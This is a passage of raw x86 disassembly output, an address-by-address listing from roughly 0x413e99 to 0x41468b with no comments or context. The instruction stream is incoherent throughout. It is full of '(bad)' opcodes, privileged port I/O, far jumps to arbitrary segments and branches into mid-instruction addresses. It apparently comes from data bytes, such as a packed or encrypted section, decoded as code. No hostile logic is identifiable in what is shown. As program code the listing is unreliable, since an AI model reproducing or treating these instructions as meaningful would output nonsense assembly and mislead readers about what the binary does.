  413e99:	mov    dh,0xfc
  413e9b:	mov    edx,0x901ada76
  413ea0:	enter  0x33b0,0x8c
  413ea4:	(bad)  
  413ea5:	xor    cl,ch
  413ea7:	push   esi
  413ea8:	out    dx,eax
  413ea9:	inc    ecx
  413eaa:	in     eax,dx
  413eab:	rol    DWORD PTR [eax],0x7f
  413eae:	ss mov dl,0x79
  413eb1:	mov    al,0x7d
  413eb3:	pop    es
  413eb4:	jp     0x413e76
  413eb6:	adc    al,0x29
  413eb8:	pop    eax
  413eb9:	jo     0x413eca
  413ebb:	aam    0x63
  413ebd:	out    0xa5,eax
  413ebf:	inc    ecx
  413ec0:	leave  
  413ec1:	(bad)  
  413ec2:	repnz push 0xd6bf3676
  413ec8:	imul   ebp,DWORD PTR [ebx+0x62cd430a],0x149c481d
  413ed2:	mov    al,0xc3
  413ed4:	sub    al,0xfd
  413ed6:	pop    ebp
  413ed7:	lea    edx,[edi+0x53]
  413eda:	jne    0x413f28
  413edc:	pop    esi
  413edd:	sbb    bh,bl
  413edf:	mov    al,ds:0xf6c22353
  413ee4:	lods   al,BYTE PTR gs:[esi]
  413ee6:	(bad)  
  413ee7:	or     al,0x10
  413ee9:	mov    esi,0x64420829
  413eee:	mov    esp,esi
  413ef0:	xchg   esi,eax
  413ef1:	mov    dh,0xd
  413ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ef4:	aas    
  413ef5:	add    eax,0x29812d98
  413efa:	stos   DWORD PTR es:[edi],eax
  413efb:	push   0x645bc1ec
  413f00:	ja     0x413ec6
  413f02:	push   ecx
  413f03:	daa    
  413f04:	fsubr  QWORD PTR [ebx-0x38]
  413f07:	enter  0x9131,0x3d
  413f0b:	sbb    ebp,DWORD PTR ds:0xf07de9b9
  413f11:	adc    al,0xec
  413f13:	(bad)  
  413f14:	pusha  
  413f15:	cmp    ebp,DWORD PTR ds:0xc47c701
  413f1b:	fwait
  413f1c:	lods   al,BYTE PTR ds:[esi]
  413f1d:	xchg   edx,eax
  413f1e:	rol    BYTE PTR [edi],cl
  413f20:	and    ah,BYTE PTR [ecx+0x51]
  413f23:	push   cs
  413f24:	loope  0x413f94
  413f26:	cmp    edx,DWORD PTR [edi-0x1b]
  413f29:	test   BYTE PTR [eax+0xf],cl
  413f2c:	jmp    0x413f73
  413f2e:	push   esp
  413f2f:	and    DWORD PTR [ecx+0x789166d4],ecx
  413f35:	add    DWORD PTR gs:[esi+0x18],edi
  413f39:	pop    esp
  413f3a:	and    cl,BYTE PTR [edx-0x64]
  413f3d:	sbb    al,0xeb
  413f3f:	jbe    0x413f78
  413f41:	imul   esi,DWORD PTR [edx],0xffffffed
  413f44:	mov    edi,0x6c518513
  413f49:	sbb    ebp,DWORD PTR [edi+0x44]
  413f4c:	and    eax,0xa491f7bf
  413f51:	dec    esp
  413f52:	jg     0x413f82
  413f54:	retf   
  413f55:	enter  0xf69f,0xc8
  413f59:	(bad)  
  413f5a:	xlat   BYTE PTR ds:[ebx]
  413f5b:	adc    edi,DWORD PTR [esi+0x2e]
  413f5e:	dec    esi
  413f5f:	test   eax,0xb74c30aa
  413f64:	xchg   BYTE PTR [ebp+0x362c14f8],dh
  413f6a:	out    0xee,eax
  413f6c:	ret    
  413f6d:	or     al,ch
  413f6f:	test   BYTE PTR [eax+0x4d],cl
  413f72:	mov    cl,0xd
  413f74:	jae    0x413f23
  413f76:	mov    al,0x37
  413f78:	lock sbb al,0xab
  413f7b:	cmp    eax,0xf39e9278
  413f80:	jo     0x413f3a
  413f82:	pop    edi
  413f83:	jmp    0x1b3a:0x259cee80
  413f8a:	ins    BYTE PTR es:[edi],dx
  413f8b:	cs dec ecx
  413f8d:	cli    
  413f8e:	jnp    0x413f15
  413f90:	jp     0x413f51
  413f92:	rcl    BYTE PTR [edi+edx*8],cl
  413f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f96:	ret    
  413f97:	push   ss
  413f98:	adc    al,0x26
  413f9a:	mov    ebp,0xf509689d
  413f9f:	jecxz  0x413f3c
  413fa1:	clc    
  413fa2:	and    DWORD PTR [eax],esp
  413fa4:	push   0x4c420db1
  413fa9:	sub    eax,0x9595d84a
  413fae:	addr16 in eax,dx
  413fb0:	aaa    
  413fb1:	push   cs
  413fb2:	test   DWORD PTR cs:[ebp+0x7b],0x9e791826
  413fba:	cwde   
  413fbb:	push   edx
  413fbc:	push   es
  413fbd:	pop    ebx
  413fbe:	mov    esi,ds
  413fc0:	pusha  
  413fc1:	lods   al,BYTE PTR ds:[esi]
  413fc2:	fdiv   QWORD PTR [ebx+0x7d]
  413fc5:	popa   
  413fc6:	aas    
  413fc7:	inc    edi
  413fc8:	adc    al,0x2d
  413fca:	jae    0x413f97
  413fcc:	sub    eax,0x4b71caf5
  413fd1:	adc    dh,BYTE PTR [ebx]
  413fd3:	adc    ecx,DWORD PTR [esi+0x28606183]
  413fd9:	gs add ah,dh
  413fdc:	test   al,0x33
  413fde:	mov    esi,0xcc0000b8
  413fe3:	test   al,0x64
  413fe5:	repnz or BYTE PTR [edi-0x71a45f60],dh
  413fec:	int3   
  413fed:	out    0x97,eax
  413fef:	jae    0x413fbe
  413ff1:	jb     0x413fbf
  413ff3:	xor    DWORD PTR [ebx+0x2b],0xbeb72afe
  413ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ffb:	mov    ch,0xac
  413ffd:	sahf   
  413ffe:	pop    ss
  413fff:	aaa    
  414000:	mov    al,0x6c
  414002:	mov    eax,ds:0x28a96531
  414007:	in     eax,dx
  414008:	xlat   BYTE PTR ds:[ebx]
  414009:	push   edi
  41400a:	aam    0xbf
  41400c:	inc    edi
  41400d:	loopne 0x41402e
  41400f:	xor    edx,DWORD PTR [ebp+0xa]
  414012:	clc    
  414013:	dec    ebx
  414014:	retf   0x5b1c
  414017:	js     0x414071
  414019:	pop    ebp
  41401a:	aaa    
  41401b:	ds add al,0x6d
  41401e:	in     al,0xf7
  414020:	push   esi
  414021:	lock sub bh,bl
  414024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414025:	fidivr WORD PTR [edx+esi*8-0x3e]
  414029:	fwait
  41402a:	test   bh,0x14
  41402d:	fist   WORD PTR [ecx-0x1b]
  414030:	pop    ecx
  414031:	mov    ss,ebp
  414033:	fwait
  414034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414035:	cdq    
  414036:	cs and eax,0x9dc9448e
  41403c:	into   
  41403d:	push   0x39
  41403f:	retf   
  414040:	cmp    al,0xe8
  414042:	fst    QWORD PTR [ebp-0x5a3e2276]
  414048:	js     0x41400d
  41404a:	cld    
  41404b:	scas   al,BYTE PTR es:[edi]
  41404c:	mov    bl,0x8b
  41404e:	test   al,0x0
  414050:	ss loop 0x414063
  414053:	aaa    
  414054:	outs   dx,BYTE PTR ds:[esi]
  414055:	fmul   st,st(2)
  414057:	pop    ss
  414058:	xchg   edx,eax
  414059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41405a:	bound  ecx,QWORD PTR [esp+ebp*2+0x2de0fbbb]
  414061:	fcomp  DWORD PTR [esi-0x47a2ae72]
  414067:	push   cs
  414068:	stos   DWORD PTR es:[edi],eax
  414069:	mov    esi,0xd5ef53ab
  41406e:	(bad)  
  41406f:	scas   al,BYTE PTR es:[edi]
  414070:	jg     0x41402d
  414072:	inc    edx
  414073:	or     DWORD PTR [edi+ebx*2+0x6c],ebp
  414077:	sbb    DWORD PTR [esi+0x50],ecx
  41407a:	xchg   edx,eax
  41407b:	mov    ch,0xd8
  41407d:	je     0x4140a8
  41407f:	fs push ecx
  414081:	mov    al,ds:0xc0953076
  414086:	icebp  
  414087:	icebp  
  414088:	dec    esi
  414089:	std    
  41408a:	cld    
  41408b:	(bad)  
  41408c:	les    esi,FWORD PTR [ecx+0x6c]
  41408f:	xor    al,0xd2
  414091:	enter  0x4ad1,0x2d
  414095:	sbb    al,0xe4
  414097:	stos   DWORD PTR es:[edi],eax
  414098:	push   ebp
  414099:	popa   
  41409a:	jno    0x4140cb
  41409c:	cmp    edi,esp
  41409e:	mov    ds:0x1636e349,eax
  4140a3:	push   ds
  4140a4:	or     eax,0x1db5f1fa
  4140a9:	push   DWORD PTR [ecx-0x26661131]
  4140af:	int    0xbd
  4140b1:	or     eax,0xbdc98746
  4140b6:	fld    st(1)
  4140b8:	int    0xd8
  4140ba:	leave  
  4140bb:	cmove  esp,DWORD PTR ds:0xb3a266b2
  4140c2:	cmp    dh,BYTE PTR [eax+0x4]
  4140c5:	cld    
  4140c6:	imul   eax,DWORD PTR [ecx+eax*8+0x5cee942e],0x57
  4140ce:	ins    DWORD PTR es:[edi],dx
  4140cf:	arpl   WORD PTR [edi-0x69],si
  4140d2:	xchg   edx,eax
  4140d3:	and    BYTE PTR [eax-0x487d035b],dl
  4140d9:	jnp    0x41405c
  4140db:	(bad)  
  4140dc:	clc    
  4140dd:	jmp    0x32e7b2fc
  4140e2:	test   eax,0xad9f423e
  4140e7:	jae    0x41406a
  4140e9:	mov    ah,al
  4140eb:	bnd jns 0x4140d8
  4140ee:	bound  edx,QWORD PTR [esi-0x1b247eb8]
  4140f4:	pop    ds
  4140f5:	(bad)  
  4140f6:	xchg   ebx,eax
  4140f7:	cmp    esp,edx
  4140f9:	(bad)  
  4140fa:	fisubr WORD PTR [ebx+0x1]
  4140fd:	jne    0x414095
  4140ff:	mov    ebx,0x21bffc35
  414104:	outs   dx,DWORD PTR ds:[esi]
  414105:	(bad)  
  414106:	call   0xfbf2849
  41410b:	add    eax,0x3883f098
  414110:	inc    ecx
  414111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414112:	dec    BYTE PTR cs:[eax-0x46]
  414116:	xor    eax,0x85311844
  41411b:	adc    eax,0xf910c5f3
  414120:	xchg   esp,eax
  414121:	push   cs
  414122:	mov    eax,ds:0x8cbb52bc
  414127:	mov    ch,0x81
  414129:	sub    BYTE PTR [ebp+esi*4-0x3f],bl
  41412d:	push   ss
  41412e:	bound  ebp,QWORD PTR [eax+eiz*2+0x4cd58dea]
  414135:	scas   eax,DWORD PTR es:[edi]
  414136:	mov    al,0x6f
  414138:	cmc    
  414139:	mov    ebp,0xeb0b8905
  41413e:	popa   
  41413f:	cmc    
  414140:	cmovl  eax,DWORD PTR ds:0xa958789b
  414147:	xor    eax,0xbc3cfc17
  41414c:	xchg   esi,eax
  41414d:	inc    ebp
  41414e:	cmp    edx,DWORD PTR ss:[eax]
  414151:	push   ebx
  414152:	test   eax,0x97dabf57
  414157:	mov    bh,0x73
  414159:	mov    al,ds:0xd1c50992
  41415e:	fistp  QWORD PTR [eax+0x34]
  414161:	cmp    al,0x82
  414163:	icebp  
  414164:	push   0x54980e35
  414169:	mov    esi,0x8a076488
  41416e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41416f:	jl     0x414187
  414171:	fwait
  414172:	add    BYTE PTR [esi-0x498a4cc0],al
  414178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414179:	adc    bl,BYTE PTR [esi]
  41417b:	fldcw  WORD PTR [edx-0x201239f4]
  414181:	pushf  
  414182:	pop    es
  414183:	add    ch,BYTE PTR [edi-0x1a]
  414186:	ja     0x4141e4
  414188:	nop
  414189:	iret   
  41418a:	in     al,0x72
  41418c:	fcmovb st,st(6)
  41418e:	sbb    eax,0xfad3cffa
  414193:	xchg   edi,eax
  414194:	xchg   edx,eax
  414195:	les    eax,FWORD PTR [esp+eax*2+0x8]
  414199:	je     0x414200
  41419b:	inc    edx
  41419c:	data16 outs dx,BYTE PTR ds:[esi]
  41419e:	inc    ebp
  41419f:	xchg   edi,eax
  4141a0:	fadd   QWORD PTR [edi+0x65]
  4141a3:	sbb    DWORD PTR [eax-0x4e3991f5],esi
  4141a9:	mov    ds:0x8f0612b5,eax
  4141ae:	inc    ebx
  4141af:	mov    dl,0x53
  4141b1:	and    eax,DWORD PTR [ecx-0x286fffbb]
  4141b7:	dec    eax
  4141b8:	jno    0x414151
  4141ba:	fwait
  4141bb:	or     al,0xbd
  4141bd:	jl     0x4141c2
  4141bf:	ret    
  4141c0:	inc    edi
  4141c1:	xchg   DWORD PTR [ebx+0x5ea51d52],ebx
  4141c7:	push   0xffffffcf
  4141c9:	add    eax,0xe8a6d9f7
  4141ce:	push   eax
  4141cf:	jmp    0x73ec:0xec01c4f7
  4141d6:	leave  
  4141d7:	jge    0x414230
  4141d9:	adc    edi,DWORD PTR ds:0x962bdfc3
  4141df:	push   esp
  4141e0:	add    dh,BYTE PTR [edx+ebp*4+0x1c]
  4141e4:	mul    DWORD PTR [edx+0x27]
  4141e7:	call   0x9cd7:0x123f4bc4
  4141ee:	je     0x414217
  4141f0:	push   esp
  4141f1:	push   ebx
  4141f2:	scas   eax,DWORD PTR es:[edi]
  4141f3:	mov    ch,0xba
  4141f5:	sbb    eax,0xe6345ee1
  4141fa:	pushf  
  4141fb:	js     0x4141f3
  4141fd:	mov    eax,ds:0x879e5e79
  414202:	push   ebp
  414203:	jmp    0x4141fe
  414205:	adc    DWORD PTR [edx+esi*4+0x22],0xfd39c6ac
  41420d:	fisttp QWORD PTR [esp+eax*8]
  414210:	sub    BYTE PTR ds:0x36e2ee44,cl
  414216:	push   ebx
  414217:	out    dx,eax
  414218:	xchg   esi,eax
  414219:	inc    esp
  41421a:	fist   WORD PTR [esi-0x3]
  41421d:	jp     0x4141b8
  41421f:	xor    al,0x91
  414221:	add    eax,0xbaffd670
  414226:	push   ds
  414227:	lods   al,BYTE PTR ds:[esi]
  414228:	add    dh,cl
  41422a:	cmp    eax,0x8ea8ccb6
  41422f:	dec    eax
  414230:	sub    ch,bh
  414232:	stc    
  414233:	daa    
  414234:	repnz adc esp,0x5fc06a3b
  41423b:	cs push cs
  41423d:	adc    DWORD PTR [edi],ebp
  41423f:	pop    esp
  414240:	lea    ecx,[ebx+0x8bff54c]
  414246:	adc    al,0xde
  414248:	xor    eax,0x9378fecc
  41424d:	jae    0x414296
  41424f:	dec    eax
  414250:	mov    ebp,0xb440fb8c
  414255:	mov    esp,0x3855fac0
  41425a:	adc    ebx,esi
  41425c:	fidivr WORD PTR [esi+0x26]
  41425f:	mov    cl,0xbd
  414261:	cdq    
  414262:	xlat   BYTE PTR ds:[ebx]
  414263:	inc    edx
  414264:	mov    bh,BYTE PTR [edi]
  414266:	mov    WORD PTR [edi+0xa7f43f7],cs
  41426c:	shr    BYTE PTR [ebx],1
  41426e:	xor    esp,ecx
  414270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414271:	jmp    0xd88a:0x4186b599
  414278:	std    
  414279:	cmp    al,0x64
  41427b:	mul    BYTE PTR [esi+edi*1]
  41427e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41427f:	int3   
  414280:	mov    dl,0x32
  414282:	retf   
  414283:	sub    eax,0xac494ec1
  414288:	push   0xffffffae
  41428a:	jno    0x4142f8
  41428c:	cwde   
  41428d:	inc    esp
  41428e:	(bad)  
  414290:	in     eax,dx
  414291:	push   0x83311e3a
  414296:	nop
  414297:	in     al,0xc0
  414299:	lods   eax,DWORD PTR ds:[esi]
  41429a:	push   ebp
  41429b:	dec    edx
  41429c:	les    edi,FWORD PTR [ecx-0x26]
  41429f:	stc    
  4142a0:	ins    DWORD PTR es:[edi],dx
  4142a1:	jnp    0x414226
  4142a3:	in     al,0xb
  4142a5:	pop    ecx
  4142a6:	into   
  4142a7:	xchg   ecx,eax
  4142a8:	or     ecx,DWORD PTR [esi]
  4142aa:	mov    cl,0x2f
  4142ac:	mov    DWORD PTR [esi],eax
  4142ae:	or     edx,DWORD PTR [edx+0x5a]
  4142b1:	sub    BYTE PTR [esi-0x1af292ad],cl
  4142b7:	out    0xf5,eax
  4142b9:	or     bl,BYTE PTR [edx-0x63ab8d1e]
  4142bf:	or     eax,0x635feed3
  4142c4:	rol    DWORD PTR ds:0x952dd4bf,cl
  4142ca:	lock add al,0x4a
  4142cd:	daa    
  4142ce:	in     eax,0xb5
  4142d0:	sbb    eax,0x1eeca993
  4142d5:	mov    ebp,0x8b82a271
  4142da:	and    al,0x86
  4142dc:	repnz cdq 
  4142de:	inc    ebp
  4142df:	add    ch,BYTE PTR [edx]
  4142e1:	je     0x41429f
  4142e3:	add    al,0x25
  4142e5:	sahf   
  4142e6:	inc    esp
  4142e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142e8:	fnstsw WORD PTR [eax]
  4142ea:	js     0x41432b
  4142ec:	pusha  
  4142ed:	push   cs
  4142ee:	and    al,0xfe
  4142f0:	nop
  4142f1:	fisttp DWORD PTR [esi]
  4142f3:	ficomp DWORD PTR [edi]
  4142f5:	cmp    edx,ebx
  4142f7:	rol    bh,1
  4142f9:	je     0x4142db
  4142fb:	xor    DWORD PTR ds:0x6eaced9e,eax
  414301:	retf   
  414302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414303:	xor    al,BYTE PTR [esi-0x27]
  414306:	(bad)  
  414307:	(bad)
  41430b:	call   0xa7f1:0xdbfbe0cf
  414312:	clc    
  414313:	adc    al,0xe4
  414315:	xor    edx,DWORD PTR ds:0xbffb3387
  41431b:	inc    ebx
  41431c:	add    ecx,ebp
  41431e:	(bad)  
  41431f:	mov    ds:0xdd095333,ax
  414325:	and    eax,0x88b40204
  41432a:	xor    edx,DWORD PTR [esi*1-0x1f166a94]
  414331:	or     eax,0x6fd6f7b3
  414336:	xchg   edi,eax
  414337:	xchg   edi,eax
  414338:	outs   dx,BYTE PTR ds:[esi]
  414339:	mov    ds:0x15aa9f42,al
  41433e:	sub    al,0xd9
  414340:	int    0xa1
  414342:	xor    eax,0x1ee23694
  414347:	(bad)  
  414348:	js     0x4142e9
  41434a:	dec    ebp
  41434b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41434c:	popa   
  41434d:	pop    eax
  41434e:	push   ebp
  41434f:	out    0x3e,al
  414351:	scas   eax,DWORD PTR es:[edi]
  414352:	fnstsw WORD PTR [esi+0x15c245c4]
  414358:	sub    dh,bh
  41435a:	icebp  
  41435b:	test   eax,0x409df312
  414360:	lahf   
  414361:	repnz add edx,DWORD PTR [ecx]
  414364:	add    ah,bh
  414366:	mov    bl,BYTE PTR [eax+esi*2-0x1b]
  41436a:	xor    eax,0xa51fa1d8
  41436f:	rol    esi,cl
  414371:	repnz aaa 
  414373:	push   edx
  414374:	in     al,0x63
  414376:	test   DWORD PTR [edi],edi
  414378:	out    dx,eax
  414379:	mov    DWORD PTR [eax],ebx
  41437b:	jbe    0x414396
  41437d:	sbb    BYTE PTR [edx],bl
  41437f:	add    eax,0x73640b9f
  414384:	add    dh,BYTE PTR [ecx+0x72f21e2a]
  41438a:	into   
  41438b:	inc    esp
  41438c:	sbb    BYTE PTR [edi-0x59],bl
  41438f:	lods   eax,DWORD PTR ds:[esi]
  414390:	xor    eax,0xb0246d89
  414395:	ret    0xfa0f
  414398:	ror    dh,cl
  41439a:	mov    ?,WORD PTR [eax]
  41439c:	daa    
  41439d:	adc    DWORD PTR [ebx],ecx
  41439f:	sbb    eax,esp
  4143a1:	jbe    0x4143a3
  4143a3:	test   ah,0x81
  4143a6:	dec    esp
  4143a7:	fwait
  4143a8:	mov    eax,0x55219050
  4143ad:	lock cmp eax,DWORD PTR [eax]
  4143b0:	add    esi,DWORD PTR [ecx+edx*2]
  4143b3:	xchg   esp,eax
  4143b4:	xchg   edx,eax
  4143b5:	inc    ebp
  4143b6:	stc    
  4143b7:	rol    BYTE PTR [ebx-0x26],1
  4143ba:	mov    edi,0x3c931db6
  4143bf:	mov    ah,0x78
  4143c1:	mov    ?,WORD PTR [esi+0x2b]
  4143c4:	bound  esp,QWORD PTR cs:[esi+0xc05cea3]
  4143cb:	leave  
  4143cc:	pop    ebp
  4143cd:	cmp    eax,0x33be04de
  4143d2:	sub    DWORD PTR [eax],0xffffff96
  4143d5:	xor    edi,DWORD PTR [edx]
  4143d7:	fwait
  4143d8:	call   0x5d4fd6e8
  4143dd:	add    eax,0xc65c5472
  4143e2:	sbb    ah,al
  4143e4:	jnp    0x414400
  4143e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143e7:	int    0xa4
  4143e9:	neg    ebx
  4143eb:	shl    esp,1
  4143ed:	sbb    DWORD PTR [edx+eax*2],0xb58ffbd3
  4143f4:	fcmovbe st,st(3)
  4143f6:	cmp    eax,0xf9ba9601
  4143fb:	add    DWORD PTR [ebx+0x56d80e2],ecx
  414401:	or     ebx,esp
  414403:	test   eax,0xe26b076c
  414408:	out    0x47,al
  41440a:	xor    bh,BYTE PTR [ebx+0x2dd1f1c6]
  414410:	push   esp
  414411:	jmp    0x1019:0xbdeba3fc
  414418:	into   
  414419:	or     bh,ah
  41441b:	call   0xa546:0x468c17f6
  414422:	cmp    bh,BYTE PTR [ebp-0x54337333]
  414428:	fsubr  DWORD PTR [eax]
  41442a:	mov    edi,0x3d701d7e
  41442f:	push   esi
  414430:	test   eax,eax
  414432:	pop    edx
  414433:	icebp  
  414434:	dec    edx
  414435:	cmp    DWORD PTR [edx+0x71],ebp
  414438:	mov    al,0x14
  41443a:	sub    al,0x4b
  41443c:	test   eax,0xa1221459
  414441:	out    0xb3,al
  414443:	and    edx,0xe16668d5
  414449:	cmc    
  41444a:	add    esp,DWORD PTR ds:[ebx+0x12]
  41444e:	mov    al,ds:0x96e13bdb
  414453:	les    esp,FWORD PTR [esi+0x44]
  414456:	out    dx,eax
  414457:	xor    BYTE PTR [ebx],bl
  414459:	cmp    DWORD PTR [edx+0x68058a13],esp
  41445f:	add    BYTE PTR [ecx+0x7b],ah
  414462:	fdiv   DWORD PTR [ebx+0xc59805a]
  414468:	xor    al,0x17
  41446a:	mov    dh,0xc7
  41446c:	hlt    
  41446d:	inc    eax
  41446e:	dec    ah
  414470:	adc    eax,esi
  414472:	idiv   BYTE PTR [ebx+edx*1+0x15]
  414476:	mov    dl,0xd0
  414478:	loopne 0x414413
  41447a:	jmp    0x87626ebd
  41447f:	in     eax,dx
  414480:	cmc    
  414481:	or     BYTE PTR [ebx-0x12],dl
  414484:	aad    0x5b
  414486:	push   es
  414487:	xchg   edx,eax
  414488:	addr16 sub ah,0xd2
  41448c:	jge    0x41441a
  41448e:	pop    esp
  41448f:	dec    ebp
  414490:	mov    esi,0xf359bf7
  414495:	fnstcw WORD PTR [ecx+ebp*1]
  414498:	or     cl,BYTE PTR [eax]
  41449a:	mov    edx,0x8aad7db1
  41449f:	or     DWORD PTR [ebp+0x56],0x3d
  4144a3:	push   ebx
  4144a4:	bound  eax,QWORD PTR fs:[eax]
  4144a7:	xor    DWORD PTR [ebx],eax
  4144a9:	sub    esp,ebx
  4144ab:	add    cl,BYTE PTR [ebp-0x1191d6af]
  4144b1:	xchg   ecx,eax
  4144b2:	and    ah,BYTE PTR [ebx+0x2d]
  4144b5:	pop    ebp
  4144b6:	adc    eax,0x3245da33
  4144bb:	mov    ah,0x92
  4144bd:	mov    ebp,0xfec62c9a
  4144c2:	in     al,0x1b
  4144c4:	(bad)  
  4144c5:	dec    ecx
  4144c6:	mov    bl,0x6f
  4144c8:	pop    eax
  4144c9:	repnz xor DWORD PTR [ebx],edi
  4144cc:	mov    ebp,0x88d40b6f
  4144d1:	in     eax,0xc7
  4144d3:	sub    al,0x8c
  4144d5:	push   ecx
  4144d6:	in     eax,dx
  4144d7:	jmp    0x53af:0x5301e005
  4144de:	out    dx,eax
  4144df:	ins    DWORD PTR es:[edi],dx
  4144e0:	cmp    BYTE PTR [ecx-0x5d],ch
  4144e3:	loopne 0x414509
  4144e5:	xor    DWORD PTR [ecx],ebx
  4144e7:	ret    
  4144e8:	xor    BYTE PTR [edx-0x57203585],bh
  4144ee:	dec    edi
  4144ef:	fmul   QWORD PTR [ebp-0x97f26e0]
  4144f5:	push   ds
  4144f6:	cmp    edi,DWORD PTR [esi+0x5d]
  4144f9:	int    0x95
  4144fb:	mov    dh,0xa9
  4144fd:	xor    al,0xa6
  4144ff:	(bad)  
  414500:	loopne 0x4144b1
  414502:	into   
  414503:	loop   0x4144d6
  414505:	test   eax,0xe038394c
  41450a:	int    0x3f
  41450c:	push   cs
  41450d:	out    0xb0,eax
  41450f:	repnz pop ecx
  414511:	icebp  
  414512:	loope  0x41449c
  414514:	xor    BYTE PTR [ecx-0x48],cl
  414517:	(bad)  [edx+0x45cc1145]
  41451d:	xchg   ebx,eax
  41451e:	mov    WORD PTR [eax-0x6880297],fs
  414524:	call   0x8e368ae6
  414529:	(bad)  
  41452a:	sub    ch,BYTE PTR [ebp+ebx*2+0x7c]
  41452e:	sbb    cl,ch
  414530:	xchg   esp,eax
  414531:	cmp    BYTE PTR [ebx-0x506aad95],0x3d
  414538:	lods   al,BYTE PTR ds:[esi]
  414539:	bound  esi,QWORD PTR [ebx+0x78]
  41453c:	or     al,BYTE PTR [ebx+0x4b19836d]
  414542:	inc    esp
  414543:	sub    esi,DWORD PTR [ebx]
  414545:	add    al,0xc4
  414547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414548:	adc    esp,DWORD PTR [edi-0x762c8125]
  41454e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41454f:	mov    eax,ds:0x96c85996
  414554:	sub    esp,esp
  414556:	or     BYTE PTR [ebx],0x69
  414559:	pushf  
  41455a:	push   ebx
  41455b:	push   esi
  41455c:	mov    eax,ds:0x92de6ec3
  414561:	jo     0x4145bb
  414563:	(bad)  
  414564:	loopne 0x414543
  414566:	cmp    al,0x9d
  414568:	inc    edx
  414569:	push   eax
  41456a:	pop    edx
  41456b:	jecxz  0x41450f
  41456d:	fcmove st,st(1)
  41456f:	into   
  414570:	inc    ebx
  414571:	jo     0x4145ee
  414573:	push   cs
  414574:	adc    BYTE PTR [edx],al
  414576:	push   0xffffffca
  414578:	lea    edx,[ecx+eiz*8+0x45]
  41457c:	or     ebx,0x162c28d7
  414582:	pop    eax
  414583:	popa   
  414584:	es xchg ebp,eax
  414586:	js     0x4145a8
  414588:	retf   0x7f4a
  41458b:	aam    0x3d
  41458d:	adc    al,0x90
  41458f:	xor    al,0x2b
  414591:	add    al,0x7b
  414593:	enter  0xd30b,0x14
  414597:	shr    DWORD PTR [eax+0x114b0523],0x4f
  41459e:	mov    cl,0x7d
  4145a0:	inc    ebp
  4145a1:	loopne 0x4145d9
  4145a3:	loope  0x414604
  4145a5:	or     DWORD PTR [esi-0x79e4ffd9],edx
  4145ab:	and    bh,cl
  4145ad:	dec    esp
  4145ae:	add    dl,BYTE PTR [ecx-0x6e3f145c]
  4145b4:	cmp    esi,edi
  4145b6:	sub    eax,0x3836e916
  4145bb:	fcmovbe st,st(2)
  4145bd:	ret    0x4d1f
  4145c0:	jge    0x414641
  4145c2:	sub    bl,BYTE PTR [edx+0x69]
  4145c5:	xor    bl,al
  4145c7:	pop    es
  4145c8:	rol    DWORD PTR [ebp-0x52],0x1
  4145cc:	sub    eax,0xfc27d07c
  4145d1:	outs   dx,DWORD PTR ds:[esi]
  4145d2:	dec    ecx
  4145d3:	loop   0x4145f6
  4145d5:	arpl   WORD PTR [esi-0x57cc3dee],bp
  4145db:	(bad)  
  4145dc:	mov    eax,ds:0xbef1a7dd
  4145e1:	fsubr  DWORD PTR [edi+0x37]
  4145e4:	mov    ecx,0xe769e541
  4145e9:	inc    eax
  4145ea:	mov    esp,0x251e0cd1
  4145ef:	lods   al,BYTE PTR ds:[esi]
  4145f0:	and    bl,BYTE PTR [edx+0x38bbbd36]
  4145f6:	cdq    
  4145f7:	adc    BYTE PTR [edi],0x69
  4145fa:	mov    ds:0x50aa27c6,eax
  4145ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414600:	jg     0x41459f
  414602:	(bad)  
  414603:	jmp    0x414635
  414605:	jmp    0x41463f
  414607:	outs   dx,BYTE PTR ds:[esi]
  414608:	inc    esi
  414609:	mov    ds:0x8b3c6115,eax
  41460e:	add    eax,0x61b9a796
  414613:	jno    0x4145ff
  414615:	mov    ecx,0x33d729e7
  41461a:	jne    0x4145ee
  41461c:	(bad)  
  41461e:	ds dec eax
  414620:	push   esi
  414621:	sti    
  414622:	test   DWORD PTR [ecx-0x473e517a],eax
  414628:	nop
  414629:	and    esp,DWORD PTR [ecx]
  41462b:	mov    ebp,0xa3132fe
  414630:	fwait
  414631:	int    0xc4
  414633:	sub    esi,DWORD PTR [esi]
  414635:	arpl   dx,sp
  414637:	(bad)  
  414638:	pop    edi
  414639:	leave  
  41463a:	xor    ch,dl
  41463c:	inc    ebx
  41463d:	shl    BYTE PTR [eax-0xe],1
  414640:	out    0xfa,al
  414642:	push   eax
  414643:	(bad)  
  414644:	in     eax,dx
  414645:	sbb    al,BYTE PTR [esi+0x1a]
  414648:	jecxz  0x4145cc
  41464a:	loop   0x414664
  41464c:	jno    0x414614
  41464e:	inc    edi
  41464f:	call   0xa89317f8
  414654:	das    
  414655:	enter  0xb1f0,0x4f
  414659:	push   ds
  41465a:	repz add ebx,DWORD PTR [ecx+0x1c6b68d]
  414661:	jl     0x41469d
  414663:	aad    0x1f
  414665:	loopne 0x414661
  414667:	adc    eax,0xedc54b06
  41466c:	push   esp
  41466d:	xchg   esi,eax
  41466e:	and    al,0x2c
  414670:	outs   dx,BYTE PTR ds:[esi]
  414671:	add    DWORD PTR [eax+ecx*2-0x5b],0x7e
  414676:	dec    edi
  414677:	mov    edx,0x6fa8b6f7
  41467c:	pop    ebx
  41467d:	jmp    0x320731c7
  414682:	cmp    BYTE PTR ds:0x24360d7b,dl
  414688:	hlt    
  414689:	cmp    al,0x40
  41468b:	adc    esi,ebx
